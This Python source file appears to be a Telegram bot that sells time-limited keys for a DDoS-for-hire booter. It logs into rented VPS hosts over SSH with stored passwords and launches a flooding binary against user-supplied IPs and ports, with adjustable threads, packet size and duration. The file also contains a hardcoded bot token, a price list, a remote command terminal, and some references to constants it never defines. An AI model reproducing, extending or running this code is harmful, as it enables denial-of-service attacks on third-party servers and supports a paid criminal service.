import time
import logging
import json
from threading import Thread
import telebot
import asyncio
import socket
import subprocess
import random
import string
import psutil
from telebot.util import escape
from typing import Tuple, Dict, List, Optional
from datetime import datetime, timedelta
from telebot.apihelper import ApiTelegramException
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
import warnings
from cryptography.utils import CryptographyDeprecationWarning
import signal
import sys
import os
import paramiko
import uuid
from stat import S_ISDIR
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

paramiko.Transport._preferred_ciphers = (
    'aes256-ctr',
    'aes192-ctr',
    'aes128-ctr',
    'aes256-cbc',
    'aes192-cbc',
    'aes128-cbc',
    'blowfish-cbc',
    '3des-cbc'
)

# Thread configuration persistence
CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'config.json')

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

def load_config():
    """Load configuration from file with validation"""
    default_config = {
        'threads_per_vps': 200,
        'packet_size': 64  # Default packet size in bytes
    }
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                config = json.load(f)
                # Validate loaded config
                if not isinstance(config.get('threads_per_vps'), int):
                    logger.warning("Invalid thread count in config, using default")
                    return default_config
                if config['threads_per_vps'] < 100 or config['threads_per_vps'] > 10000:
                    logger.warning(f"Thread count {config['threads_per_vps']} out of range, using default")
                    return default_config
                if not isinstance(config.get('packet_size'), int):
                    config['packet_size'] = default_config['packet_size']
                if config['packet_size'] < 1 or config['packet_size'] > 65500:
                    config['packet_size'] = default_config['packet_size']
                return config
    except Exception as e:
        logger.error(f"Config load error: {e}")
    return default_config


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

def save_config(threads=None, packet_size=None):
    """Save configuration with strict validation"""
    try:
        config = load_config()
        
        if threads is not None:
            threads = int(threads)
            if threads < 100 or threads > 10000:
                logger.error(f"Invalid thread count {threads}, must be 100-10000")
                return False
            config['threads_per_vps'] = threads
            
        if packet_size is not None:
            packet_size = int(packet_size)
            if packet_size < 1 or packet_size > 65500:
                logger.error(f"Invalid packet size {packet_size}, must be 1-65500")
                return False
            config['packet_size'] = packet_size
            
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
        logger.info(f"Saved new config: {config}")
        return True
    except Exception as e:
        logger.error(f"Config save failed: {e}")
        return False

config = load_config()
THREADS_PER_VPS = config.get('threads_per_vps', 200)
PACKET_SIZE = config.get('packet_size', 64)

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

config = load_config()
THREADS_PER_VPS = config.get('threads_per_vps', DEFAULT_THREADS)
if not MIN_THREADS <= THREADS_PER_VPS <= MAX_THREADS:
    THREADS_PER_VPS = DEFAULT_THREADS
    logger.warning(f"Invalid thread count in config, using default {DEFAULT_THREADS}")

KEY_PRICES = {
    'hour': 10,    # 10 Rs per hour
    'day': 80,     # 80 Rs per day 
    '3day': 200,   # 200 Rs (discounted from 240)
    'week': 300,   # 300 Rs per week
    '15day': 900,  # 900 Rs (discounted from 1200)
    '30day': 1500  # 1500 Rs (discounted from 2400)
}

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

ADMIN_IDS = [7922553903]  # Replace with actual admin IDs
BOT_TOKEN = "7622864970:AAF8uPxSTwzZZ7unbUfq__nId28V9C-dOks"  # Replace with your bot token
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
ADMIN_FILE = 'admin_data.json'
VPS_FILE = 'vps_data.json'
OWNER_FILE = 'owner_data.json'
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
last_attack_times = {}
COOLDOWN_MINUTES = 0
ATTACK_COOLDOWN = 60  
VIP_MAX_TIME = 400    
REGULAR_MAX_TIME = 240  
BLOCKED_PORTS = [8700, 20000, 443, 17500, 9031, 20002, 20001]
OWNER_IDS = ADMIN_IDS.copy()  
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
USERS_FILE = os.path.join(BASE_DIR, 'users.txt')
KEYS_FILE = os.path.join(BASE_DIR, 'key.txt')
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
keys = {}
redeemed_keys = set()
loop = None
BOT_ENABLED = True
BOT_START_TIME = time.time()
ADMIN_MAX_TIME = 600  # Default admin max time
active_attacks = set()  # Track active attacks
MAX_CONCURRENT_ATTACKS = 4  # Maximum allowed concurrent attacks
key_counter = 1  # Initialize key counter for numbered key generation
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
ATTACK_VIDEOS = [
    "https://files.catbox.moe/pacadw.mp4",
    "https://files.catbox.moe/8k9zmt.mp4", 
    "https://files.catbox.moe/1cskm1.mp4",
    "https://files.catbox.moe/xr9y6b.mp4",
    "https://files.catbox.moe/3honi0.mp4",
    "https://files.catbox.moe/xuhmq0.mp4",
    "https://files.catbox.moe/wjtilc.mp4",
    "https://files.catbox.moe/mit6r7.mp4",
    "https://files.catbox.moe/edaojm.mp4",
    "https://files.catbox.moe/cnc8j7.mp4",
    "https://files.catbox.moe/zr3nhn.mp4",
    "https://files.catbox.moe/o4lege.mp4",
    "https://files.catbox.moe/s6wgor.mp4",
    "https://files.catbox.moe/4kmo3m.mp4",
    "https://files.catbox.moe/em27tu.mp4"
]

def get_random_video():
    return random.choice(ATTACK_VIDEOS)

def check_user_authorization(user_id):
    """Check if user is authorized to perform attacks"""
    
    # Admins and owner have full access
    if is_admin(user_id) or is_owner(user_id):
        return {'authorized': True, 'message': ''}

    users = load_users()
    user = next((u for u in users if u.get('user_id') == user_id), None)

    # User not found
    if not user:
        return {
            'authorized': False,
            'message': '🚫 *ACCESS DENIED*\n\nYou need to redeem a key first!\n\n🔑 Get a key from admin to use this bot.'
        }

    # Manual approval always allowed
    if user.get('key') == "MANUAL-APPROVAL":
        return {'authorized': True, 'message': ''}

    # Check valid_until safely
    valid_until_raw = user.get('valid_until')
    if not valid_until_raw:
        return {
            'authorized': False,
            'message': '❌ *Invalid user data.*\n\nMissing expiration date.'
        }

    try:
        valid_until = datetime.fromisoformat(str(valid_until_raw))
    except Exception:
        return {
            'authorized': False,
            'message': '❌ *Date format error.*\n\nPlease contact admin to fix your account.'
        }

    if datetime.now() > valid_until:
        return {
            'authorized': False,
            'message': '⌛ *KEY EXPIRED*\n\nYour access has expired. Please redeem a new key.\n\nContact admin for new key.'
        }

    return {'authorized': True, 'message': ''}
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

def get_active_vps_list():
    """Return list of active VPS"""
    vps_data = load_vps_data()
    active_vps = []

    # Check all VPS
    for ip, details in vps_data['vps'].items():
        try:
            # Check if VPS is responsive
            status, _ = ssh_execute(ip, details['username'], details['password'], "echo 'VPS check'")
            if status:
                active_vps.append((ip, details))
        except Exception as e:
            logger.error(f"VPS {ip} check failed: {str(e)}")
            continue

    return active_vps
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

def get_attack_menu_markup():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)
    buttons = [
        KeyboardButton("🧵 Threads: 200"),
        KeyboardButton("🧵 Threads: 500"),
        KeyboardButton("🧵 Threads: 1000"),
        KeyboardButton("📦 Packet: 64B"),
        KeyboardButton("📦 Packet: 128B"),
        KeyboardButton("📦 Packet: 512B"),
        KeyboardButton("🚀 Start Attack"),
        KeyboardButton("⬅️ Back")
    ]
    markup.add(*buttons)
    return markup

def execute_distributed_attack(vps_list, target_ip, target_port, duration, progress_callback=None):
    """Execute attack across all VPS using configured settings"""
    success = 0
    failed = 0
    total_vps = len(vps_list)
    
    # Calculate total power for reporting
    total_power = THREADS_PER_VPS * total_vps
    
    # Execute on all VPS
    for index, (ip, details) in enumerate(vps_list, start=1):
        try:
            # Verify binary exists and is executable
            check_cmd = "test -f /home/master/raja && echo 'exists' || echo 'missing'"
            status, output = ssh_execute(ip, details['username'], details['password'], check_cmd)
            
            if not status or 'missing' in output:
                logger.error(f"smokey binary not found on {ip}")
                failed += 1
                continue
                
            # Make executable if not already
            ssh_execute(ip, details['username'], details['password'], "chmod +x /home/master/raja")
            
            # Execute attack using configured settings
            attack_cmd = f"nohup /home/master/raja {target_ip} {target_port} {duration} {PACKET_SIZE} {THREADS_PER_VPS} >/dev/null 2>&1 &"
            status, output = ssh_execute(ip, details['username'], details['password'], attack_cmd)
            
            if status:
                success += 1
                logger.info(f"Attack started on {ip} with {THREADS_PER_VPS} threads and {PACKET_SIZE} byte packets")
            else:
                failed += 1
                logger.error(f"Attack failed on {ip}: {output}")

        except Exception as e:
            logger.error(f"Attack failed on {ip}: {str(e)}")
            failed += 1

        if progress_callback:
            progress_callback(index, total_vps, success, failed)
    
    return {
        'success': success,
        'failed': failed,
        'total_power': total_power,
        'threads_per_vps': THREADS_PER_VPS,
        'packet_size': PACKET_SIZE
    }
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

def load_broadcast_users() -> List[int]:
    """Load broadcast user list from file"""
    try:
        if os.path.exists('broadcast.json'):
            with open('broadcast.json', 'r') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Error loading broadcast users: {e}")
    return []
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
def save_broadcast_users(users: List[int]) -> bool:
    """Save broadcast user list to file"""
    try:
        with open('broadcast.json', 'w') as f:
            json.dump(users, f)
        return True
    except Exception as e:
        logger.error(f"Error saving broadcast users: {e}")
        return False
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
def log_execution(message_text):
    """Log messages with timestamp"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("execution_logs.txt", 'a') as f:
        f.write(f"[{timestamp}] {message_text}\n")

def signal_handler(sig, frame):
    logger.info("Shutting down gracefully...")
    bot.remove_webhook()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def generate_progress_message(attack_id, target_ip, target_port, duration, completed, total):
    """Generate progress message"""
    return f"Attack {attack_id} progress: {completed}/{total}"

def update_progress(bot, chat_id, message_id, attack_id, target_ip, target_port, duration, completed, total):
    """Update progress message"""
    bot.edit_message_text(
        generate_progress_message(attack_id, target_ip, target_port, duration, completed, total),
        chat_id=chat_id,
        message_id=message_id
    )

def handle_command_error(bot, chat_id, error_msg):
    """Handle command errors"""
    bot.send_message(chat_id, f"Error: {error_msg}")

def validate_ip(ip):
    """Simple IP validation"""
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    try:
        return all(0 <= int(part) <= 255 for part in parts)
    except ValueError:
        return False
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
def generate_final_report(bot, chat_id, message_id, attack_id, target_ip, target_port, duration, success, failed, threads):
    """Generate final attack report"""
    # Remove from active attacks
    active_attacks.discard(attack_id)
    
    bot.send_message(
        chat_id,
        f"Attack {attack_id} completed!\nSuccess: {success}\nFailed: {failed}"
    )

# Helper functions (same as before)
def load_users() -> List[Dict]:
    """Load users from file and ensure each has 'is_vip' field.
    Returns:
        List of user dictionaries, each guaranteed to have 'is_vip' field.
    """
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, 'r') as f:
                users = json.load(f)
                # Add 'is_vip' field if missing (for backward compatibility)
                for user in users:
                    if 'is_vip' not in user:
                        user['is_vip'] = False
                return users
    except Exception as e:
        logger.error(f"Error loading users: {e}")
    return []

def save_users(users: List[Dict]) -> bool:
    """Save users to file."""
    try:
        with open(USERS_FILE, 'w') as f:
            json.dump(users, f)
        return True
    except Exception as e:
        logger.error(f"Error saving users: {e}")
        return False

def load_keys() -> Dict:
    """Load keys from file."""
    try:
        if os.path.exists(KEYS_FILE):
            with open(KEYS_FILE, 'r') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Error loading keys: {e}")
    return {}

def save_keys(keys: Dict) -> bool:
    """Save keys to file."""
    try:
        with open(KEYS_FILE, 'w') as f:
            json.dump(keys, f)
        return True
    except Exception as e:
        logger.error(f"Error saving keys: {e}")
        return False

def load_admin_data() -> Dict:
    """Load admin data from file."""
    try:
        if os.path.exists(ADMIN_FILE):
            with open(ADMIN_FILE, 'r') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Error loading admin data: {e}")
    return {'admins': {}}

def save_admin_data(data: Dict) -> bool:
    """Save admin data to file."""
    try:
        with open(ADMIN_FILE, 'w') as f:
            json.dump(data, f)
        return True
    except Exception as e:
        logger.error(f"Error saving admin data: {e}")
        return False

def load_vps_data() -> Dict:
    """Load VPS data from file."""
    try:
        if os.path.exists(VPS_FILE):
            with open(VPS_FILE, 'r') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Error loading VPS data: {e}")
    return {'vps': {}}

def save_vps_data(data: Dict) -> bool:
    """Save VPS data to file."""
    try:
        with open(VPS_FILE, 'w') as f:
            json.dump(data, f)
        return True
    except Exception as e:
        logger.error(f"Error saving VPS data: {e}")
        return False

def load_owner_data() -> Dict:
    """Load owner data from file."""
    try:
        if os.path.exists(OWNER_FILE):
            with open(OWNER_FILE, 'r') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Error loading owner data: {e}")
    return {'owners': OWNER_IDS.copy()}

def save_owner_data(data: Dict) -> bool:
    """Save owner data to file."""
    try:
        with open(OWNER_FILE, 'w') as f:
            json.dump(data, f)
        return True
    except Exception as e:
        logger.error(f"Error saving owner data: {e}")
        return False

def generate_key(length: int = 16) -> str:
    """Generate a random key."""
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def calculate_key_price(amount: int, time_unit: str) -> int:
    """Calculate the price for a key."""
    if time_unit not in KEY_PRICES:
        return 0
    return amount * KEY_PRICES[time_unit]

def get_admin_balance(user_id: int) -> float:
    """Get admin balance."""
    if is_super_admin(user_id):
        return float('inf')
    
    admin_data = load_admin_data()
    return admin_data['admins'].get(str(user_id), {}).get('balance', 0)

def update_admin_balance(user_id: str, amount: float) -> bool:
    """Update admin balance."""
    if is_super_admin(int(user_id)):
        return True
    
    admin_data = load_admin_data()
    if user_id not in admin_data['admins']:
        return False
    
    current_balance = admin_data['admins'][user_id]['balance']
    if current_balance < amount:
        return False
    
    admin_data['admins'][user_id]['balance'] -= amount
    return save_admin_data(admin_data)

def is_admin(user_id: int) -> bool:
    """Check if user is admin."""
    admin_data = load_admin_data()
    return str(user_id) in admin_data['admins'] or is_super_admin(user_id)

def is_super_admin(user_id: int) -> bool:
    """Check if user is super admin."""
    return user_id in ADMIN_IDS

def is_owner(user_id: int) -> bool:
    """Check if user is owner."""
    owner_data = load_owner_data()
    return user_id in owner_data['owners']

def check_cooldown(user_id: int) -> Tuple[bool, int]:
    """Check if user is in cooldown."""
    current_time = int(time.time())  # Ensure integer timestamp
    last_attack_time = last_attack_times.get(user_id, 0)
    cooldown_seconds = int(COOLDOWN_MINUTES * 60)  # Ensure integer
    
    if current_time - last_attack_time < cooldown_seconds:
        remaining = cooldown_seconds - (current_time - last_attack_time)
        return True, int(remaining)  # Ensure integer
    return False, 0

def is_vip(user_id: int) -> bool:
    """Check if user is VIP"""
    users = load_users()
    user = next((u for u in users if u['user_id'] == user_id), None)
    return user['is_vip'] if user else False
    
def ssh_execute(ip: str, username: str, password: str, command: str, timeout: int = 10) -> tuple[bool, str]:
    """Execute SSH command on remote server."""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=username, password=password, timeout=timeout)
        
        stdin, stdout, stderr = client.exec_command(command)
        output = stdout.read().decode() + stderr.read().decode()
        client.close()
        
        return True, output
    except Exception as e:
        return False, str(e)
    
def process_vip_key_generation(message):
    global key_counter
    chat_id = message.chat.id
    user_id = message.from_user.id
    username = message.from_user.username or "Admin"
    text = message.text.strip().lower()
    
    if text == 'cancel':
        bot.send_message(
            chat_id,
            "🚫 VIP key generation cancelled",
            reply_markup=get_menu_markup(user_id)
        )
        return
    
    try:
        parts = text.split()
        if len(parts) != 2:
            raise ValueError("Invalid format")
            
        duration_type = parts[0]
        max_seconds = int(parts[1])
        
        if duration_type not in KEY_PRICES:
            raise ValueError("Invalid duration type")
            
        if max_seconds < 10 or max_seconds > 86400:  # 24 hour max
            raise ValueError("Max seconds must be between 10-86400")
            
        # Generate numbered key (APNA-BHAI-XXXX format)
        key_number = str(key_counter).zfill(4)
        key = f"APNA-BHAI-{key_number}"
        key_counter += 1
        
        # Add to keys dictionary with VIP flag and max time
        keys[key] = {
            'type': duration_type,
            'duration': 1,  # Will be multiplied based on type
            'price': KEY_PRICES[duration_type],
            'is_vip': True,
            'max_seconds': max_seconds,
            'created_by': user_id,
            'created_at': datetime.now().isoformat(),
            'redeemed': False
        }
        
        # Calculate actual duration based on type
        if duration_type == 'hour':
            keys[key]['duration'] = 1
        elif duration_type == 'day':
            keys[key]['duration'] = 1
        elif duration_type == '3day':
            keys[key]['duration'] = 3
        elif duration_type == 'week':
            keys[key]['duration'] = 7
        elif duration_type == '15day':
            keys[key]['duration'] = 15
        elif duration_type == '30day':
            keys[key]['duration'] = 30
            
        save_keys(keys)
        
        bot.send_message(
            chat_id,
            "╔════════════════════════╗\n"
            "║     💎 VIP KEY CREATED ║\n"
            "╚════════════════════════╝\n\n"
            f"*Key:* `{key}`\n"
            f"*Type:* {duration_type}\n"
            f"*Max Attack Time:* {max_seconds} seconds\n"
            f"*Generated by:* @{username}\n\n"
            "⚠️ *This key grants VIP status and custom max attack time!*\n\n"
            "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
            "꧁༺ 𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 🅰🅿🅽🅰 🅱🅷🅰🅸 ༻꧂",
            reply_markup=get_menu_markup(user_id),
            parse_mode='Markdown'
        )
        
    except ValueError as e:
        bot.send_message(
            chat_id,
            f"❌ *Error:* {str(e)}\n\n"
            "Please send in format:\n"
            "`DURATION_TYPE MAX_SECONDS`\n\n"
            "Example: `week 500`",
            reply_markup=get_menu_markup(user_id),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error generating VIP key: {e}")
        bot.send_message(
            chat_id,
            "❌ *Failed to generate VIP key!*\n\n"
            "An unexpected error occurred",
            reply_markup=get_menu_markup(user_id),
            parse_mode='Markdown'
        )

def get_vps_selection_markup():
    vps_data = load_vps_data()
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    
    buttons = []
    for ip in vps_data['vps']:
        buttons.append(KeyboardButton(f"🖥️ {ip}"))
    
    buttons.append(KeyboardButton("⬅️ Back"))
    markup.add(*buttons)
    return markup

def format_user_list(users, title):
    response = f"╔════════════════════════╗\n"
    response += f"║     {title:^20}     ║\n"
    response += f"╚════════════════════════╝\n\n"
    
    if not users:
        response += "❌ No users found!\n"
        return response
    
    for i, user in enumerate(users, 1):
        if isinstance(user, dict):  # Regular users
            expires = datetime.fromisoformat(user['valid_until'])
            remaining = expires - datetime.now()
            days = remaining.days
            hours = remaining.seconds // 3600
            response += f"🔹 {i}. ID: `{user['user_id']}`\n"
            response += f"   🔑 Key: `{user['key']}`\n"
            response += f"   ⏳ Expires in: {days}d {hours}h\n"
            response += f"   📅 Until: {expires.strftime('%d %b %Y')}\n\n"
        else:  # Admin/Owner IDs
            response += f"👑 {i}. ID: `{user}`\n"
    
    return response

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)                                     

def get_menu_markup(user_id):
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("🚀 𝐀𝐭𝐭𝐚𝐜𝐤"),
        KeyboardButton("🔑 Redeem Key"),
        KeyboardButton("📜 Rules"),
        KeyboardButton("💎 VIP Features"),
        KeyboardButton("🧵 Show Threads")
    ]
    
    if is_admin(user_id):
        buttons.append(KeyboardButton("🔑 Generate Key"))
        buttons.append(KeyboardButton("👥 User Management"))
        
    if is_super_admin(user_id):
        buttons.append(KeyboardButton("🛠️ Admin Tools"))
        buttons.append(KeyboardButton("👑 Manage VIP"))
        
    if is_owner(user_id):
        buttons.append(KeyboardButton("🖥️ VPS Management"))
        buttons.append(KeyboardButton("👑 Owner Tools"))
        # Add status indicator for owners
        status_button = KeyboardButton("🟢 Bot ON" if BOT_ENABLED else "🔴 Bot OFF")
        buttons.append(status_button)
    
    markup.add(*buttons)
    markup.add(KeyboardButton("⬅️ Back"))
    return markup


def get_user_list_markup():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("👥 All Users"),
        KeyboardButton("🔑 Key Users"),
        KeyboardButton("👑 Admins"),
        KeyboardButton("👨‍💻 Owners"),
        KeyboardButton("⬅️ Back")
    ]
    markup.add(*buttons)
    return markup

def get_vip_markup():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("🚀 Pro Attacks"),
        KeyboardButton("⏳ Extended Time"),
        KeyboardButton("📈 Attack Stats"),
        KeyboardButton("⬅️ Back")
    ]
    markup.add(*buttons)
    return markup

def get_vip_management_markup():
    """Create keyboard markup for VIP management"""
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("➕ Add VIP"),
        KeyboardButton("➖ Remove VIP"),
        KeyboardButton("📋 List VIPs"),
        KeyboardButton("⬅️ Back")
    ]
    markup.add(*buttons)
    return markup

def get_super_admin_markup():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("➕ Add Admin"),
        KeyboardButton("➖ Remove Admin"),
        KeyboardButton("⚙️ Set Threads"),
        KeyboardButton("⏱️ Bot Uptime"),
        KeyboardButton("⬅️ Back")
    ]
    markup.add(*buttons)
    return markup

# Keep all other handlers the same as in your original code
# ... [rest of your existing handlers]
def get_admin_markup():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("🗑️ Remove User"),
        KeyboardButton("📊 Check Balance"),
        KeyboardButton("👥 List Users"),  # New button
        KeyboardButton("✅ Approve User"),  # New button
        KeyboardButton("⚙️ Max Time"),  # New button
        KeyboardButton("⬅️ Back")
    ]
    markup.add(*buttons)
    return markup

def get_vps_markup():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("➕ Add VPS"),
        KeyboardButton("🗑️ Remove VPS"),
        KeyboardButton("📋 List VPS"),
        KeyboardButton("🔄 Check Status"),
        KeyboardButton("⚙️ Binary Tools"),
        KeyboardButton("💻 Terminal"),
        KeyboardButton("🔄 VPS Reset"),  # New reset button
        KeyboardButton("⬅️ Back")
    ]
    markup.add(*buttons)
    return markup

def get_vps_terminal_markup():
    """Keyboard for terminal commands"""
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("💻 Run Command"),
        KeyboardButton("📁 List Directory"),
        KeyboardButton("🔄 Check Services"),
        KeyboardButton("📊 Check Resources"),
        KeyboardButton("🛑 Kill Process"),
        KeyboardButton("⬅️ Back")
    ]
    markup.add(*buttons)
    return markup

def get_vps_binary_markup():
    """Keyboard for binary file operations"""
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("⬆️ Upload Binary"),
        KeyboardButton("🗑️ Remove Binary"),
        KeyboardButton("📋 List Binaries"),
        KeyboardButton("⬅️ Back")
    ]
    markup.add(*buttons)
    return markup

def get_vip_menu_markup():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    markup.add(KeyboardButton("🛒 Get VIP"), KeyboardButton("⬅️ Back"))
    return markup

def get_owner_markup():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("➕ Add Owner"),
        KeyboardButton("🔧 System Tools"),
        KeyboardButton("🟢 Bot ON"),
        KeyboardButton("🔴 Bot OFF"),
        KeyboardButton("⬅️ Back")
    ]
    markup.add(*buttons)
    return markup


# [Previous imports and constants remain the same until send_welcome]
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "User"

    # Register in broadcast.json
    broadcast_users = load_broadcast_users()
    if user_id not in broadcast_users:
        broadcast_users.append(user_id)
        save_broadcast_users(broadcast_users)

    # Register in users.txt
    users = load_users()
    existing = next((u for u in users if u['user_id'] == user_id), None)
    if not existing:
        new_user = {
            'user_id': user_id,
            'key': None,
            'valid_until': None,
            'is_vip': False
        }
        users.append(new_user)
        save_users(users)
        existing = new_user

    # Determine access status
    status_text = "*🚫 NO ACCESS*"
    expiry_text = ""
    if existing.get('key'):
        if existing.get('valid_until'):
            expiry_time = datetime.fromisoformat(existing['valid_until'])
            remaining = expiry_time - datetime.now()
            if remaining.total_seconds() > 0:
                status_text = "*✅ ACTIVE*"
                expiry_text = (
                    f"\n*🔑 Key Expires:* `{expiry_time.strftime('%Y-%m-%d %H:%M:%S')}`"
                    f"\n*⏳ Time Left:* `{str(remaining).split('.')[0]}`"
                )
            else:
                status_text = "*⌛ EXPIRED*"
                expiry_text = f"\n*❌ Key Expired on:* `{expiry_time.strftime('%Y-%m-%d %H:%M:%S')}`"
        else:
            status_text = "*✅ ACTIVE*"
    else:
        status_text = "*🚫 NO ACCESS*"

    # Bold welcome message
    welcome_text = (
        f"👋🏻 *WELCOME, {user_name}!* 🔥\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🤖 *THIS IS PURPLE BOT!*\n\n"
        f"🆔 *User ID:* `{user_id}`\n"
        f"🔐 *Status:* {status_text}{expiry_text}\n\n"
        "📢 *Join Our Official Channel:*\n"
        "[➖ CLICK HERE TO JOIN ➖](https://t.me/NXTLVLPUBLIC)\n\n"
        "📌 *Try This Command:*\n"
        "`/bgmi` - 🚀 *Start an attack!*\n\n"
        "👑 *BOT CREATED BY:* [@NEWAADMI](https://t.me/NEWAADMI)"
    )

    # Inline buttons
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("📢 JOIN CHANNEL", url="https://t.me/NXTLVLPUBLIC"))
    keyboard.add(InlineKeyboardButton("👑 CREATOR", url="https://t.me/NEWAADMI"))

    # Send video or fallback to text
    video_url = get_random_video()
    if video_url:
        bot.send_video(
            chat_id=message.chat.id,
            video=video_url,
            caption=welcome_text,
            parse_mode="Markdown",
            reply_markup=keyboard
        )
    else:
        bot.send_message(
            chat_id=message.chat.id,
            text=welcome_text,
            parse_mode="Markdown",
            reply_markup=keyboard
        )

    # Rebranding message
    bot.send_message(
        chat_id=message.chat.id,
        text=(
            "↘️                                                       ↙️\n\n"
            "*[➖ DM FOR REBRANDING ➖](https://t.me/TF_FLASH92)*\n\n"
            "↗️                                                       ↖️"
        ),
        parse_mode="Markdown",
        disable_web_page_preview=True
    )

    # Show reply keyboard
    bot.send_message(
        chat_id=message.chat.id,
        text="🔘 *Choose an option from the menu below:*",
        reply_markup=get_menu_markup(user_id),
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_admin(user_id):
        bot.send_message(chat_id, "🔒 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    bot.send_message(chat_id, "📨 *Send the message you want to broadcast to all users:*", parse_mode="Markdown")
